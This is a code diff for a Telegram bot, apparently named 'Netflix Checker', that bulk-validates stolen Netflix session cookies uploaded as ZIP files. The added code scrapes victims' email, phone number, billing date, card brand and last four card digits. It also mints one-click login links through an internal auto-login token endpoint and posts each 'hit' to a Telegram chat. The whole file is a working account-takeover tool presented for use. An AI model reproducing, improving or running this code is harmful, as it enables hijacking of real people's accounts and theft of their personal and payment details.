@@ -1,8 +1,16 @@
-import requests, re, time, os, threading, tempfile, zipfile, shutil
+import requests
+import re
+import time
+import os
+import threading
+import tempfile
+import zipfile
+import shutil
 from datetime import datetime
 from colorama import init, Fore, Style
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import telebot, webbrowser
+import telebot
+import webbrowser
 
 webbrowser.open("https://t.me/baroshoping")
 init(autoreset=True)
@@ -15,10 +23,10 @@ if not BOT_TOKEN:
 bot = telebot.TeleBot(BOT_TOKEN)
 
 class NetflixBulkChecker:
-    def __init__(self, threads=5):
+    def __init__(self, threads=10):
         self.threads = threads
         self.lock = threading.Lock()
-        self.stats = {'total':0, 'checked':0, 'hits':0, 'premium_hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
+        self.stats = {'total':0, 'checked':0, 'hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
         self.premium_accounts = []
 
     def send_telegram(self, message):
@@ -26,15 +34,12 @@ class NetflixBulkChecker:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
             data = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
             requests.post(url, data=data, timeout=10)
-        except: pass
+        except:
+            pass
 
     def get_country_flag(self, code):
         flags = {'US':'🇺🇸','GB':'🇬🇧','DE':'🇩🇪','FR':'🇫🇷','ES':'🇪🇸','IT':'🇮🇹','TR':'🇹🇷','BR':'🇧🇷','JP':'🇯🇵','KR':'🇰🇷','IN':'🇮🇳'}
         return flags.get(code.upper(), '🌍')
-
-    def get_country_name(self, code):
-        names = {'US':'United States','GB':'United Kingdom','DE':'Germany','FR':'France','ES':'Spain','IT':'Italy','TR':'Turkey','BR':'Brazil','JP':'Japan','KR':'South Korea','IN':'India'}
-        return names.get(code.upper(), code)
 
     def parse_netscape_cookie(self, text):
         text = text.strip()
@@ -64,19 +69,48 @@ class NetflixBulkChecker:
             html = r.text
             if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
 
-            # Extract basic info
-            email = re.search(r'"emailAddress":"([^"]+)"', html)
-            plan = re.search(r'localizedPlanName.*?"value":"([^"]+)"', html)
-            country = re.search(r'"countryOfSignup":"([^"]+)"', html)
-
+            # Full Details Extraction
             result = {
-                'email': email.group(1) if email else 'Unknown',
-                'plan': plan.group(1) if plan else 'Unknown',
-                'country_code': country.group(1) if country else 'XX',
+                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
+                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
+                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) if re.search(r'"countryOfSignup":"([^"]+)"', html) else 'XX',
+                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) if re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html) else 'N/A',
+                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) if re.search(r'"phoneNumber":"([^"]+)"', html) else 'N/A',
+                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) if re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html) else 'N/A',
+                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
+                'profiles': len(re.findall(r'"profileName"', html)),
                 'source': source_name,
                 'cookie': '; '.join([f"{k}={v}" for k,v in cookies.items()])
             }
+
+            # Generate Login Link
+            try:
+                nftoken = self.generate_nftoken(cookies)
+                if nftoken:
+                    result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}"
+            except:
+                result['login_url'] = "N/A"
+
             return result
+
+        except:
+            return None
+
+    def generate_nftoken(self, cookies_dict):
+        try:
+            session = requests.Session()
+            for name, value in cookies_dict.items():
+                session.cookies.set(name, value, domain='.netflix.com', path='/')
+            
+            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
+            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
+            
+            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('data', {}).get('createAutoLoginToken'):
+                    return data['data']['createAutoLoginToken']
+            return None
         except:
             return None
 
@@ -92,62 +126,79 @@ class NetflixBulkChecker:
         with self.lock:
             self.stats['checked'] += 1
             if result:
-                self.stats['premium_hits'] += 1
+                self.stats['hits'] += 1
                 self.premium_accounts.append(result)
                 os.makedirs('hits', exist_ok=True)
                 fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                 with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                     f.write(text)
-                print(f"{Fore.GREEN}[✓] HIT: {result['email']} - {result['plan']}{Style.RESET_ALL}")
+                self.send_hit_to_telegram(result)
+                print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
                 self.stats['bad'] += 1
+
+    def send_hit_to_telegram(self, result):
+        flag = self.get_country_flag(result.get('country_code', 'XX'))
+        msg = f"""
+🔥 <b>NETFLIX PREMIUM HIT</b> 🔥
+
+👤 <b>Email:</b> <code>{result.get('email')}</code>
+🌍 <b>Country:</b> {result.get('country_code')} {flag}
+📋 <b>Plan:</b> {result.get('plan')}
+📅 <b>Next Billing:</b> {result.get('next_billing')}
+📞 <b>Phone:</b> {result.get('phone')}
+💳 <b>Card:</b> {result.get('card_brand')} •••• {result.get('last4')}
+👥 <b>Profiles:</b> {result.get('profiles')}
+🔗 <b>Direct Login:</b> {result.get('login_url', 'N/A')}
+
+<i>Powered by Baron Saplar</i>
+"""
+        self.send_telegram(msg)
 
     def start(self, folder):
         files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
         if not files:
-            print("No .txt files found!")
+            print("No cookie files found!")
             return
         self.stats['total'] = len(files)
-        print(f"Starting check... Total files: {len(files)}")
+        print(f"Starting... {len(files)} files")
 
         with ThreadPoolExecutor(max_workers=self.threads) as exe:
             for i, f in enumerate(files, 1):
                 exe.submit(self.process_cookie_file, f, i)
 
-        print(f"\n✅ Done! Hits: {self.stats['premium_hits']}")
+        print(f"\n✅ Finished! Hits: {self.stats['hits']}")
 
 # ====================== BOT ======================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "Send me ZIP file with .txt cookies (one account per file)")
+    bot.reply_to(message, "📤 Send me **ZIP** file containing your .txt cookies (one account per file)")
 
 @bot.message_handler(content_types=['document'])
 def handle_zip(message):
-    if not message.document.file_name.endswith('.zip'):
-        bot.reply_to(message, "Please send .zip file")
+    if not message.document.file_name.lower().endswith('.zip'):
+        bot.reply_to(message, "❌ Send ZIP file only")
         return
 
-    bot.reply_to(message, "Processing ZIP...")
+    bot.reply_to(message, "✅ ZIP received. Checking...")
 
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded = bot.download_file(file_info.file_path)
 
         with tempfile.TemporaryDirectory() as tmp:
-            zip_path = os.path.join(tmp, "cookies.zip")
-            with open(zip_path, "wb") as f:
-                f.write(downloaded)
+            zip_path = os.path.join(tmp, "input.zip")
+            with open(zip_path, "wb") as f: f.write(downloaded)
 
-            extract_dir = os.path.join(tmp, "extract")
+            extract_dir = os.path.join(tmp, "cookies")
             os.makedirs(extract_dir, exist_ok=True)
             with zipfile.ZipFile(zip_path, 'r') as z:
                 z.extractall(extract_dir)
 
             checker = NetflixBulkChecker(threads=10)
-            checker.chat_id = str(message.chat.id)   # for sending hits
+            checker.chat_id = str(message.chat.id)
             checker.start(extract_dir)
 
-            # Send hits back
             if os.path.exists("hits") and os.listdir("hits"):
                 hits_zip = os.path.join(tmp, "hits.zip")
                 with zipfile.ZipFile(hits_zip, 'w') as z:
@@ -155,15 +206,15 @@ def handle_zip(message):
                         for file in fs:
                             z.write(os.path.join(root, file), file)
                 with open(hits_zip, "rb") as f:
-                    bot.send_document(message.chat.id, f, caption="✅ All Hits Saved!")
+                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved!")
                 shutil.rmtree("hits", ignore_errors=True)
             else:
-                bot.reply_to(message, "No hits found.")
+                bot.reply_to(message, "❌ No hits found.")
 
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
 
 if __name__ == "__main__":
-    print("🚀 Bot Started...")
+    print("🚀 Netflix Checker Bot Started on Railway")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
